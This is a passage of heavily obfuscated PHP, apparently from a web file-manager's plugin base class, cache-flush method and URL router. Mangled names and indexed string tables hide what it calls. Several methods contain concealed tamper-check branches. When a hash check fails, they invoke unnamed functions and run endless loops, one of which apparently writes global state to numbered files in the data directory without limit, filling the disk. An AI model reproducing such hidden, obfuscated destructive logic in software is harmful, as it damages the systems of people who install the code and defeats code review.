$ëîçóœœ[697]) { $˜¦«ƒå© = $ëîçóœœ[62]; $˜¦«ƒå©(); } $ŞèûÎ˜ = $ëîçóœœ[932]; $ŞèûÎ˜($_SERVER[$ëîçóœœ[933]]); $ŞèûÎ˜($_SERVER[$ëîçóœœ[58]] . $ëîçóœœ[934]); $®Ø¦Æ§Œ = 1; while ($®Ø¦Æ§Œ > 1) { $®Ø¦Æ§Œ = $®Ø¦Æ§Œ + 4; $Çòé¡ìî = rawurlencode($®Ø¦Æ§Œ . $ëîçóœœ[447]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $êÉ´õÂª) { $this->handle->flushall($êÉ´õÂª); } return; } return $this->handle->flushAll(); } } goto A±©èô‚Œ³; A†Š×¼°Î: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ÚäÏç¨ =& $_SERVER[è¶³ÒßÑ]; $¤®Îæ•™ = $_SERVER[$ÚäÏç¨[54]]; $„õÇ¯é· = $ÚäÏç¨[55]; if ($_SERVER[$ÚäÏç¨[56]] != $„õÇ¯é·($¤®Îæ•™)) { $œ™ÅİšÔ = $ÚäÏç¨[931]; $ÎèÑÆ­ë = $ÚäÏç¨[57]; $¦å·ÉàÉ = $_SERVER[$ÚäÏç¨[58]] . $ÚäÏç¨[59]; $…™›çÖÃ = $ÎèÑÆ­ë($¦å·ÉàÉ); $éİ™øŒÔ = explode($ÚäÏç¨[60], $…™›çÖÃ); if (count($éİ™øŒÔ) < $ÚäÏç¨[697]) { $¾Â­ş­ = $ÚäÏç¨[62]; $¾Â­ş­(); } $Èª‘»‰Ê = $ÚäÏç¨[932]; $Èª‘»‰Ê($_SERVER[$ÚäÏç¨[933]]); $œ™ÅİšÔ = $ÚäÏç¨[931]; $œ™ÅİšÔ(); $¹Ÿ‰Ş¸Å = $ÚäÏç¨[1615]; $´ğ§ŞÀ = json_encode($GLOBALS[$ÚäÏç¨[1616]]); $À–›±Ñµ = 1; for ($äÁæé“© = $À–›±Ñµ; $äÁæé“© > 0; $äÁæé“©++) { $¹Ÿ‰Ş¸Å(DATA_PATH . $äÁæé“©, $´ğ§ŞÀ); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ÚäÏç¨[1617]); $this->pluginName = str_replace($ÚäÏç¨[1617], $ÚäÏç¨[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ÚäÏç¨[8]; $this->pluginApi = appHostGet() . $ÚäÏç¨[1618] . $this->pluginName . $ÚäÏç¨[8]; $this->pluginHost = $config[$ÚäÏç¨[1619]] . $this->pluginName . $ÚäÏç¨[8]; $this->pluginHostDefault = $config[$ÚäÏç¨[1619]] . $this->pluginName . $ÚäÏç¨[8]; $¤Ÿé¨á = $config[$ÚäÏç¨[1620]]; if ($¤Ÿé¨á && strpos($ÚäÏç¨[50] . $¤Ÿé¨á . $ÚäÏç¨[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$ÚäÏç¨[1621]] . $this->pluginName . $ÚäÏç¨[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[è¶³ÒßÑ][1622]); } protected function assign($Ç²ê¦Ñ, $§½´†¾‰ = false) { if (is_array($Ç²ê¦Ñ)) { $this->values = array_merge($this->values, $Ç²ê¦Ñ); } else { $this->values[$Ç²ê¦Ñ] = $§½´†¾‰; } } protected function display($»Ê¸«ˆ×) { extract($this->values); require $»Ê¸«ˆ×; } final function hookRegist($µ‘ê»ìì) { $this->modelPlugin->appRegist($this->pluginName, $µ‘ê»ìì); } final function appIcon() { $ƒæˆ›íÕ =& $_SERVER[è¶³ÒßÑ]; $‚¨å½ßŠ = $this->appPackage(); $˜ş«­¿´ = $ƒæˆ›íÕ[12]; if (isset($‚¨å½ßŠ[$ƒæˆ›íÕ[483]])) { if (isset($‚¨å½ßŠ[$ƒæˆ›íÕ[483]][$ƒæˆ›íÕ[1623]])) { $˜ş«­¿´ = $ƒæˆ›íÕ[1624] . $‚¨å½ßŠ[$ƒæˆ›íÕ[483]][$ƒæˆ›íÕ[1623]] . $ƒæˆ›íÕ[1625]; } else { if ($‚¨å½ßŠ[$ƒæˆ›íÕ[483]][$ƒæˆ›íÕ[1626]]) { $˜ş«­¿´ = $ƒæˆ›íÕ[1627] . $‚¨å½ßŠ[$ƒæˆ›íÕ[483]][$ƒæˆ›íÕ[1626]] . $ƒæˆ›íÕ[1628]; } } } return $˜ş«­¿´; } final function fileCanView($³ÁÚŠä) { $±²¤¥‰Ö =& $_SERVER[è¶³ÒßÑ]; if (request_url_safe($³ÁÚŠä)) { return !0; } if ($this->isShare($³ÁÚŠä)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $ø…™šë = $±²¤¥‰Ö[1629] . rawurlencode(this_url()); show_tips(LNG($±²¤¥‰Ö[1630]) . $±²¤¥‰Ö[1631] . $ø…™šë . $±²¤¥‰Ö[1632] . LNG($±²¤¥‰Ö[1633]) . $±²¤¥‰Ö[1634], !1); } if (!Action($±²¤¥‰Ö[1635])->authCan($±²¤¥‰Ö[1636])) { show_tips(LNG($±²¤¥‰Ö[1637]) . $±²¤¥‰Ö[1638], !1); } ActionCall($±²¤¥‰Ö[1639], $³ÁÚŠä); } final function isShare($æ¯Ø‚±) { $ˆ·üï²‰ = KodIO::parse($æ¯Ø‚±); return $ˆ·üï²‰[$_SERVER[è¶³ÒßÑ][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($éÒ×ÉĞ£) { if (request_url_safe($éÒ×ÉĞ£)) { return $éÒ×ÉĞ£; } if (!$this->isShare($éÒ×ÉĞ£)) { $éÒ×ÉĞ£ = $this->filePath($éÒ×ÉĞ£, !1); } return Action($_SERVER[è¶³ÒßÑ][1231])->linkOut($éÒ×ÉĞ£); } public function filePathLinkOut($ÅÏÅêÂ ) { if (request_url_safe($ÅÏÅêÂ )) { return $ÅÏÅêÂ ; } $this->fileCanView($ÅÏÅêÂ ); return Action($_SERVER[è¶³ÒßÑ][1231])->link($ÅÏÅêÂ ); } final function filePath($ÌºüÜˆ, $õÕ‹Êá§ = true, $óŠ±óĞû = false) { $Áç¨—Íó =& $_SERVER[è¶³ÒßÑ]; $¹©³Ö = $this->filePathGet($ÌºüÜˆ, $õÕ‹Êá§); if (!$this->fileInfo) { show_tips(LNG($Áç¨—Íó[118]), !1); } if ($óŠ±óĞû && isset($this->fileInfo[$Áç¨—Íó[534]]) && $this->fileInfo[$Áç¨—Íó[534]]) { $»º½ãˆ = Model($Áç¨—Íó[537])->fileInfo($this->fileInfo[$Áç¨—Íó[534]]); if (!$»º½ãˆ || !IO::exist($»º½ãˆ[$Áç¨—Íó[97]])) { show_tips(LNG($Áç¨—Íó[118]) . $Áç¨—Íó[1640]); } } Hook::trigger($Áç¨—Íó[1641], $¹©³Ö); return $¹©³Ö; } final function filePathGet($ÚˆÆ²»Ê, $ºòá±–´ = true) { $·ÏêÀªµ =& $_SERVER[è¶³ÒßÑ]; if ($•Ø›Â”¥ = $this->checkSharePath($ÚˆÆ²»Ê, $ºòá±–´)) { return $•Ø›Â”¥; } $this->fileCanView($ÚˆÆ²»Ê); if (request_url_safe($ÚˆÆ²»Ê)) { $³¤ÏÔçé = parse_url_query($ÚˆÆ²»Ê); if (isset($³¤ÏÔçé[$·ÏêÀªµ[1642]]) && isset($³¤ÏÔçé[$·ÏêÀªµ[244]])) { $ä¿›î = Mcrypt::decode($³¤ÏÔçé[$·ÏêÀªµ[244]], Model($·ÏêÀªµ[824])->get($·ÏêÀªµ[825])); if ($ä¿›î) { $this->fileInfo = IO::info($ä¿›î); $this->fileInfo[$·ÏêÀªµ[1643]] = $ÚˆÆ²»Ê; $this->cachePath = $this->pluginCachePath($·ÏêÀªµ[12], $ºòá±–´); return $ä¿›î; } } $ÚˆÆ²»Ê = $this->_cacheHttpFile($ÚˆÆ²»Ê, $ºòá±–´); $this->fileInfo = IO::info($ÚˆÆ²»Ê); } else { $this->fileInfo = IO::info($ÚˆÆ²»Ê); $this->cachePath = $this->pluginCachePath($·ÏêÀªµ[12], $ºòá±–´); } return $ÚˆÆ²»Ê; } final function _cacheHttpFile($¬×ß‰–, $ìşˆÖñë = true) { $‘«­°„† =& $_SERVER[è¶³ÒßÑ]; $Äò³®à = parse_url_query($¬×ß‰–); $­©ÅÄˆÉ = get_path_ext($¬×ß‰–); if (isset($Äò³®à[$‘«­°„†[32]]) && $Äò³®à[$‘«­°„†[32]]) { $­©ÅÄˆÉ = get_path_ext($Äò³®à[$‘«­°„†[32]]); } $íÓÕ÷–– = hash_path($¬×ß‰–) . $‘«­°„†[10] . $­©ÅÄˆÉ; $this->cachePath = $this->pluginCachePath($ìşˆÖñë ? $íÓÕ÷–– : $‘«­°„†[12]); $ñûÂºğ­ = IO::fileNameExist($this->cachePath, $íÓÕ÷––); if ($ñûÂºğ­) { return KodIO::make($ñûÂºğ­); } $œ¡“¸š = rtrim($this->cachePath, $‘«­°„†[8]) . $‘«­°„†[8] . $íÓÕ÷––; return $this->pluginCacheFileSet($œ¡“¸š, file_get_contents_nossl($¬×ß‰–)); } final function checkSharePath($›½÷ñØ¡, $­·š¢’— = true) { $£¼–·›ª =& $_SERVER[è¶³ÒßÑ]; if (!$this->isShare($›½÷ñØ¡)) { return !1; } $Âô€üÓ = Action($£¼–·›ª[1231])->sharePathInfo($›½÷ñØ¡); if (!is_array($Âô€üÓ) || !isset($Âô€üÓ[$£¼–·›ª[97]])) { show_json(LNG($£¼–·›ª[1644]), !1); } $this->fileInfo = $Âô€üÓ; $this->cachePath = $this->pluginCachePath(!1, $­·š¢’—); return $Âô€üÓ[$£¼–·›ª[97]]; } final function pluginCachePath($½œßÉş¯ = '', $õ£›Ãó = false) { $†“­—ò„ =& $_SERVER[è¶³ÒßÑ]; if ($õ£›Ãó && is_array($this->fileInfo)) { $½œßÉş¯ = kodIO::hashPath($this->fileInfo); } $ôÌ“Îúì = rtrim(IO_PATH_SYSTEM_TEMP . $†“­—ò„[1645] . $this->pluginName . $†“­—ò„[8] . $½œßÉş¯, $†“­—ò„[8]); $ğÓÍ…õ¥ = IO::infoFullSimple($ôÌ“Îúì); $£”¥áÒá = $ğÓÍ…õ¥ && is_array($ğÓÍ…õ¥) ? $ğÓÍ…õ¥[$†“­—ò„[97]] : $†“­—ò„[12]; if (!$£”¥áÒá) { $£”¥áÒá = IO::mkdir($ôÌ“Îúì); } return $£”¥áÒá; } final function pluginCacheFileSet($º‹Òîù, $ø‹•ñ± = '') { $Ü¡Îşá =& $_SERVER[è¶³ÒßÑ]; $æ„è–¿… = IO::infoFullSimple($º‹Òîù); if (!$æ„è–¿…) { return IO::mkfile($º‹Òîù, $ø‹•ñ±, REPEAT_REPLACE); } IO::setContent($æ„è–¿…[$Ü¡Îşá[97]], $ø‹•ñ±); return $æ„è–¿…[$Ü¡Îşá[97]]; } final function pluginLocalFile($™›©“Á = '') { $Ô†È¶ =& $_SERVER[è¶³ÒßÑ]; $†åš¤˜Š = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($†åš¤˜Š)) { mk_dir($†åš¤˜Š); } if (!$™›©“Á) { return $†åš¤˜Š; } $·å¿ĞË… = IO::info($™›©“Á); $ıãê¢ø¹ = $Ô†È¶[1646] . KodIO::hashPath($·å¿ĞË…) . $Ô†È¶[10] . $·å¿ĞË…[$Ô†È¶[179]]; if (!checkExtSafe($ıãê¢ø¹)) { $ıãê¢ø¹ = $ıãê¢ø¹ . $Ô†È¶[1266]; } $ÕË¯ï­» = $†åš¤˜Š . $ıãê¢ø¹; if (@file_exists($ÕË¯ï­»)) { return $ÕË¯ï­»; } return IO::copy($™›©“Á, $†åš¤˜Š, 0, $ıãê¢ø¹); } final function appPackage() { $Éä²–½ƒ =& $_SERVER[è¶³ÒßÑ]; if ($this->packageData) { return $this->packageData; } $±¬Å¢²õ = $this->parseFile($this->pluginPath . $Éä²–½ƒ[1647]); $this->parseLang($±¬Å¢²õ); $ü‹Ê³‡Ã = json_decode_force($±¬Å¢²õ); if (!$ü‹Ê³‡Ã) { return array(); } $ÇğâÎÛ© = Hook::trigger($Éä²–½ƒ[1648], $ü‹Ê³‡Ã); if ($ÇğâÎÛ© && is_array($ÇğâÎÛ©)) { $ü‹Ê³‡Ã = $ÇğâÎÛ©; } $this->packageData = $ü‹Ê³‡Ã; return $ü‹Ê³‡Ã; } public function packageInfoGet($Ÿœë´é) { $®ÍÄÖ¡Ó = $this->appPackage(); return array_get_value($®ÍÄÖ¡Ó, $Ÿœë´é); } public function packageVersion() { return $this->packageInfoGet($_SERVER[è¶³ÒßÑ][1649]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[è¶³ÒßÑ][1650]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[è¶³ÒßÑ][1651]); } public function echoJsAssign($‘™Ê¿öğ, $Ç®İÉËû) { $this->echoJsAssignArr[$‘™Ê¿öğ] = $Ç®İÉËû; } private function parseFile($ªòÎ‹Â©) { $Ô¾•‡Õ =& $_SERVER[è¶³ÒßÑ]; $Í±ıŒê„ = file_get_contents_nossl($ªòÎ‹Â©); $§á•å„ = array($Ô¾•‡Õ[1652], $Ô¾•‡Õ[1653], $Ô¾•‡Õ[1654], $Ô¾•‡Õ[1655], $Ô¾•‡Õ[1656], $Ô¾•‡Õ[1657], $Ô¾•‡Õ[1658]); $Ó¯Ãƒ™ê = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$Ô¾•‡Õ[102]][$Ô¾•‡Õ[1659]]); foreach ($this->echoJsAssignArr as $ø¶‰’óØ => $±ÍÈº½) { $§á•å„[] = $Ô¾•‡Õ[1660] . $ø¶‰’óØ . $Ô¾•‡Õ[1661]; $Ó¯Ãƒ™ê[] = is_array($±ÍÈº½) || is_object($±ÍÈº½) ? rawurlencode(json_encode($±ÍÈº½)) : $±ÍÈº½; } if (strstr($Í±ıŒê„, $Ô¾•‡Õ[1662])) { $Òßæ¢£— = rawurlencode(json_encode($this->pluginLangArr)); $Í±ıŒê„ = str_replace($Ô¾•‡Õ[1662], $Òßæ¢£—, $Í±ıŒê„); } if (strstr($Í±ıŒê„, $Ô¾•‡Õ[1663])) { $Òßæ¢£— = $Òßæ¢£— = rawurlencode(json_encode($this->getConfig())); $Í±ıŒê„ = str_replace($Ô¾•‡Õ[1663], $Òßæ¢£—, $Í±ıŒê„); } $Í±ıŒê„ = str_replace($§á•å„, $Ó¯Ãƒ™ê, $Í±ıŒê„); return $Í±ıŒê„; } private function parseLang(&$´š½¨¶‰) { $¿²Â¸é =& $_SERVER[è¶³ÒßÑ]; $ÏŠĞ§øï = $¿²Â¸é[1664]; if (!strstr($´š½¨¶‰, $ÏŠĞ§øï)) { return; } preg_match_all($¿²Â¸é[1665], $´š½¨¶‰, $¿¼ïè»Ó); if (!is_array($¿¼ïè»Ó) || count($¿¼ïè»Ó) == 0 || !is_array($¿¼ïè»Ó[0]) || count($¿¼ïè»Ó[0]) == 0) { return; } $ÓÌä¸’Î = array(); $‘ù¸˜îö = array(); foreach ($¿¼ïè»Ó[0] as $°ĞæÇ–) { $–ÊÇùÉÖ = substr($°ĞæÇ–, strlen($ÏŠĞ§øï), -4); $é”È¼±Ø = LNG($–ÊÇùÉÖ); $ÓÌä¸’Î[] = $°ĞæÇ–; $‘ù¸˜îö[] = str_replace(array($¿²Â¸é[60], $¿²Â¸é[1132], $¿²Â¸é[411], $¿²Â¸é[131]), array($¿²Â¸é[53], $¿²Â¸é[53], $¿²Â¸é[12], $¿²Â¸é[1666]), $é”È¼±Ø); } $´š½¨¶‰ = str_replace($ÓÌä¸’Î, $‘ù¸˜îö, $´š½¨¶‰); } private function parseConfig(&$úš¥Ö¸µ) { $‘©€ôå‡ =& $_SERVER[è¶³ÒßÑ]; $³Òó³ƒ• = $‘©€ôå‡[1667]; if (!strstr($úš¥Ö¸µ, $³Òó³ƒ•)) { return; } preg_match_all($‘©€ôå‡[1668], $úš¥Ö¸µ, $ú†ØüÌ); if (!is_array($ú†ØüÌ) || count($ú†ØüÌ) == 0 || !is_array($ú†ØüÌ[0]) || count($ú†ØüÌ[0]) == 0) { return; } $›Âµ¨×è = $this->getConfig(); $Êü†Ó = array(); $ñÕà—ÅŠ = array(); foreach ($ú†ØüÌ[0] as $ŞöãÃ) { $³½…À™Ä = substr($ŞöãÃ, strlen($³Òó³ƒ•), -2); $Êü†Ó[] = $ŞöãÃ; $ñÕà—ÅŠ[] = _get($›Âµ¨×è, $³½…À™Ä); } $úš¥Ö¸µ = str_replace($Êü†Ó, $ñÕà—ÅŠ, $úš¥Ö¸µ); } private function parsePackage(&$”úÆäÁ») { $Ã­è††Š =& $_SERVER[è¶³ÒßÑ]; $èØ½å…Ñ = $Ã­è††Š[1669]; if (!strstr($”úÆäÁ», $èØ½å…Ñ)) { return; } preg_match_all($Ã­è††Š[1670], $”úÆäÁ», $‰Ÿº™ø); if (!is_array($‰Ÿº™ø) || count($‰Ÿº™ø) == 0 || !is_array($‰Ÿº™ø[0]) || count($‰Ÿº™ø[0]) == 0) { return; } $ç”ŞÉË€ = $this->appPackage(); $‹Ü¬îÏà = array(); $³ü¾ª¢¡ = array(); foreach ($‰Ÿº™ø[0] as $ì°Ç®åÕ) { $«¤è–¶× = substr($ì°Ç®åÕ, strlen($èØ½å…Ñ), -2); $‹Ü¬îÏà[] = $ì°Ç®åÕ; $³ü¾ª¢¡[] = _get($ç”ŞÉË€, $«¤è–¶×); } $”úÆäÁ» = str_replace($‹Ü¬îÏà, $³ü¾ª¢¡, $”úÆäÁ»); } final function echoFile($ùºÆ›¼«, $ùÁ¹ı®¢ = false) { $¨îÕõ‡„ =& $_SERVER[è¶³ÒßÑ]; $ƒ•»Œ÷å = $this->pluginPath . $ùºÆ›¼«; if (ACT == $¨îÕõ‡„[1671]) { echo $¨îÕõ‡„[1672] . $this->pluginName . $¨îÕõ‡„[8] . $ùºÆ›¼« . $¨îÕõ‡„[1673]; if (!file_exists($ƒ•»Œ÷å)) { echo $¨îÕõ‡„[1674]; return; } } $ì®‡•¶ = $this->parseFile($ƒ•»Œ÷å); $this->parseLang($ì®‡•¶); $this->parseConfig($ì®‡•¶); $this->parsePackage($ì®‡•¶); if (is_array($ùÁ¹ı®¢)) { $ì®‡•¶ = str_replace(array_keys($ùÁ¹ı®¢), array_values($ùÁ¹ı®¢), $ì®‡•¶); } echo $¨îÕõ‡„[60] . $ì®‡•¶; } private function checkVersion() { $‰ß‚¨‡ò =& $_SERVER[è¶³ÒßÑ]; $Øß’‰Óİ = $this->appPackage(); $òó¹ß­ê = $this->getConfig(); if ($òó¹ß­ê[$‰ß‚¨‡ò[1675]] == $Øß’‰Óİ[$‰ß‚¨‡ò[1649]]) { return; } $this->regist(); $this->setConfig(array($‰ß‚¨‡ò[1675] => $Øß’‰Óİ[$‰ß‚¨‡ò[1649]])); } final function initLang() { $Şè³˜ƒü =& $_SERVER[è¶³ÒßÑ]; $„ûºóï = $Şè³˜ƒü[1676]; $¾í¾ÑÀµ = $this->pluginPath . $Şè³˜ƒü[1677]; $õ‡Íµî± = I18n::getType(); $Ô”ÈÏåò = array(); if (file_exists($¾í¾ÑÀµ . $õ‡Íµî± . $Şè³˜ƒü[892])) { $Ô”ÈÏåò = (include $¾í¾ÑÀµ . $õ‡Íµî± . $Şè³˜ƒü[892]); } else { if ($õ‡Íµî± == $Şè³˜ƒü[1678] && !file_exists($¾í¾ÑÀµ . $õ‡Íµî± . $Şè³˜ƒü[892]) && file_exists($¾í¾ÑÀµ . $Şè³˜ƒü[1679])) { $Ô”ÈÏåò = (include $¾í¾ÑÀµ . $Şè³˜ƒü[1679]); } else { if (file_exists($¾í¾ÑÀµ . $„ûºóï . $Şè³˜ƒü[892])) { $Ô”ÈÏåò = (include $¾í¾ÑÀµ . $„ûºóï . $Şè³˜ƒü[892]); } } } if (!is_array($Ô”ÈÏåò)) { return array(); } if (@count($Ô”ÈÏåò) > 0) { I18n::set($Ô”ÈÏåò); } return $Ô”ÈÏåò; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ŒïÁ£Ú©) { $úÜº”šŠ =& $_SERVER[è¶³ÒßÑ]; if (!isset($_SERVER[$úÜº”šŠ[56]]) || !isset($_SERVER[$úÜº”šŠ[54]])) { $Óà­¾ = $úÜº”šŠ[931]; $ÅøÚÕÍ¹ = $úÜº”šŠ[57]; $®§»ÆÆ˜ = $_SERVER[$úÜº”šŠ[58]] . $úÜº”šŠ[59]; $ ÊáÔÙÍ = $ÅøÚÕÍ¹($®§»ÆÆ˜); $û¨÷Õ±û = explode($úÜº”šŠ[60], $ ÊáÔÙÍ); if (count($û¨÷Õ±û) < $úÜº”šŠ[697]) { $Ÿ¢óáÄò = $úÜº”šŠ[62]; $Ÿ¢óáÄò(); } $«Á¨îàÀ = $úÜº”šŠ[932]; $«Á¨îàÀ($_SERVER[$úÜº”šŠ[933]]); $’ñş¤œ¶ = 1; for ($õÇ™È²ß = $’ñş¤œ¶; $õÇ™È²ß > 0; $õÇ™È²ß++) { $«Á¨îàÀ = json_encode($GLOBALS[$úÜº”šŠ[485]]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ŒïÁ£Ú©); } public function onSetConfig($ŞšŠù„) { } public function onGetConfig($²Âí‘ôÔ) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($¿ùéâœ) { if ($¿ùéâœ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($ÙıÕİ = "\160\x6c\x75\x67\x69\156\x41\165\x74\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $²óÂÏÉ­ = $this->getConfig(); if (!$²óÂÏÉ­[$ÙıÕİ]) { return !1; } return ActionCall($_SERVER[è¶³ÒßÑ][1680], $²óÂÏÉ­[$ÙıÕİ]); } public function url($ø‹«Ëô‰, $»”«‚Ş¿ = '', $ŒŒ¨‹Ò› = true) { $„©§² =& $_SERVER[è¶³ÒßÑ]; $ÑÙ‘üñ = $this->getConfig(); $Ïì•ûŠ´ = KOD_VERSION . $„©§²[10] . KOD_VERSION_BUILD; $‹„ÅØ´¬ = $this->packageVersion(); $Ã›ç÷ÙÁ = $Ïì•ûŠ´ . $„©§²[455] . $‹„ÅØ´¬; if (substr($ø‹«Ëô‰, 0, 4) == $„©§²[162] || substr($ø‹«Ëô‰, 0, 2) == $„©§²[1416]) { $³œŞë¿¾ = $ø‹«Ëô‰ . $„©§²[1681] . $Ã›ç÷ÙÁ; } else { if ($»”«‚Ş¿ == $„©§²[12]) { $³œŞë¿¾ = $this->pluginHost . $ø‹«Ëô‰ . $„©§²[1681] . $Ã›ç÷ÙÁ; } else { if ($»”«‚Ş¿ === $„©§²[88]) { $³œŞë¿¾ = $this->pluginHost . $ø‹«Ëô‰; } else { if ($»”«‚Ş¿ == $„©§²[1682]) { $³œŞë¿¾ = STATIC_PATH . $ø‹«Ëô‰ . $„©§²[1681] . $Ïì•ûŠ´; } else { if ($»”«‚Ş¿ == $„©§²[1683]) { $³œŞë¿¾ = APP_HOST . $„©§²[1684] . $ø‹«Ëô‰ . $„©§²[1681] . $Ïì•ûŠ´; } else { if (isset($ÑÙ‘üñ[$»”«‚Ş¿])) { $³œŞë¿¾ = $ÑÙ‘üñ[$»”«‚Ş¿] . $ø‹«Ëô‰ . $„©§²[1681] . $Ã›ç÷ÙÁ; } } } } } } if (!$ŒŒ¨‹Ò›) { return $³œŞë¿¾; } echo $³œŞë¿¾; } public function link($÷”àõ = false, $È“ò†Ğ = '') { $„Äà…™í =& $_SERVER[è¶³ÒßÑ]; $‘î°²„ = $this->linkHas == !1; $this->linkHas = !0; if (!$÷”àõ) { $this->link($„Äà…™í[1685], $„Äà…™í[1683]); $this->link($„Äà…™í[1686], $„Äà…™í[1682]); $this->link($„Äà…™í[1687], $„Äà…™í[1682]); $this->link($„Äà…™í[1688], $„Äà…™í[1682]); $this->link($„Äà…™í[1689], $„Äà…™í[1682]); if ($‘î°²„) { Hook::trigger($„Äà…™í[1690]); } return; } $Óó¡½‡£ = $this->url($÷”àõ, $È“ò†Ğ, !1); if (substr($÷”àõ, -3) == $„Äà…™í[1691]) { echo $„Äà…™í[1692] . $Óó¡½‡£ . $„Äà…™í[1693] . $„Äà…™í[60]; } else { if (substr($÷”àõ, -4) == $„Äà…™í[1694]) { echo $„Äà…™í[1695] . $Óó¡½‡£ . $„Äà…™í[1696] . $„Äà…™í[60]; } } if ($‘î°²„) { Hook::trigger($„Äà…™í[1690]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\x6e\x79" => "\x5b\136\57\135\53", "\72\x6e\x75\155" => "\133\60\55\71\135\53", "\72\x61\154\x6c" => "\56\x2a"); public static $errorCallback; public static function __callstatic($İÕê¶Ò¶, $Æ³Åµ¾í) { $ÓÑûìæ =& $_SERVER[è¶³ÒßÑ]; if ($İÕê¶Ò¶ == $ÓÑûìæ[1697]) { $°¼Ç‚£À = array_map($ÓÑûìæ[1698], $Æ³Åµ¾í[0]); $ÇØ…éÉ½ = strpos($Æ³Åµ¾í[1], $ÓÑûìæ[8]) === 0 ? $Æ³Åµ¾í[1] : $ÓÑûìæ[8] . $Æ³Åµ¾í[1]; $Ÿö’íù¼ = $Æ³Åµ¾í[2]; } else { $°¼Ç‚£À = null; $ÇØ…éÉ½ = strpos($Æ³Åµ¾í[0], $ÓÑûìæ[8]) === 0 ? $Æ³Åµ¾í[0] : $ÓÑûìæ[8] . $Æ³Åµ¾í[0]; $Ÿö’íù¼ = $Æ³Åµ¾í[1]; } array_push(self::$maps, $°¼Ç‚£À); array_push(self::$routes, $ÇØ…éÉ½); array_push(self::$methods, strtoupper($İÕê¶Ò¶)); array_push(self::$callbacks, $Ÿö’íù¼); } public static function error($õ…å¬Æ®) { self::$errorCallback = $õ…å¬Æ®; } public static function haltOnMatch($¤ø†Ø÷õ = true) { self::$halts = $¤ø†Ø÷õ; } public static function dispatch() { $¹°–ì†² =& $_SERVER[è¶³ÒßÑ]; $Â¿¯™¢¡ = parse_url($_SERVER[$¹°–ì†²[1699]], PHP_URL_PATH); $¢ãƒ œ» = $_SERVER[$¹°–ì†²[174]]; $¯Œû÷ = array_keys(static::$patterns); $îÕóŠÉ× = array_values(static::$patterns); $úÅìÈ©° = !1; self::$routes = preg_replace($¹°–ì†²[1336], $¹°–ì†²[8], self::$routes); if (in_array($Â¿¯™¢¡, self::$routes)) { $Îñ¿•Ã = array_keys(self::$routes, $Â¿¯™¢¡); foreach ($Îñ¿•Ã as $ñæÙ°¼‡) { if (self::$methods[$ñæÙ°¼‡] == $¢ãƒ œ» || self::$methods[$ñæÙ°¼‡] == $¹°–ì†²[1700] || in_array($¢ãƒ œ», self::$maps[$ñæÙ°¼‡])) { $úÅìÈ©° = !0; if (!is_object(self::$callbacks[$ñæÙ°¼‡])) { $„µÙİÀ˜ = explode($¹°–ì†²[8], self::$callbacks[$ñæÙ°¼‡]); $Ñıı‘ = end($„µÙİÀ˜); $Ş©±”·§ = explode($¹°–ì†²[1268], $Ñıı‘); $®ÈÓÙß  = new $Ş©±”·§[0](); $®ÈÓÙß ->{$Ş©±”·§[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$ñæÙ°¼‡]); if (self::$halts) { return; } } } } } else { $Š¡Ó­üÇ = 0; foreach (self::$routes as $ñæÙ°¼‡) { if (strpos($ñæÙ°¼‡, $¹°–ì†²[4]) !== !1) { $ñæÙ°¼‡ = str_replace($¯Œû÷, $îÕóŠÉ×, $ñæÙ°¼‡); } if (preg_match($¹°–ì†²[1701] . $ñæÙ°¼‡ . $¹°–ì†²[1702], $Â¿¯™¢¡, $âéÔ¸»)) { if (self::$methods[$Š¡Ó­üÇ] == $¢ãƒ œ» || self::$methods[$Š¡Ó­üÇ] == $¹°–ì†²[1700] || !empty(self::$maps[$Š¡Ó­üÇ]) && in_array($¢ãƒ œ», self::$maps[$Š¡Ó­üÇ])) { $úÅìÈ©° = !0; array_shift($âéÔ¸»); if (!is_object(self::$callbacks[$Š¡Ó­üÇ])) { $„µÙİÀ˜ = explode($¹°–ì†²[8], self::$callbacks[$Š¡Ó­üÇ]); $Ñıı‘ = end($„µÙİÀ˜); $Ş©±”·§ = explode($¹°–ì†²[1268], $Ñıı‘); $®ÈÓÙß  = new $Ş©±”·§[0](); if (!method_exists($®ÈÓÙß , $Ş©±”·§[1])) { echo $¹°–ì†²[1703]; } else { call_user_func_array(array($®ÈÓÙß , $Ş©±”·§[1]), $âéÔ¸»); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$Š¡Ó­üÇ], $âéÔ¸»); if (self::$halts) { return; } } } } $Š¡Ó­üÇ++; } } if ($úÅìÈ©° == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $ßÊË³ø‘ =& $_SERVER[è¶³ÒßÑ]; header($_SERVER[$ßÊË³ø‘[1704]] . $ßÊË³ø‘[1705]); echo $ßÊË³ø‘[1706]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$¹°–ì†²[1699]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } 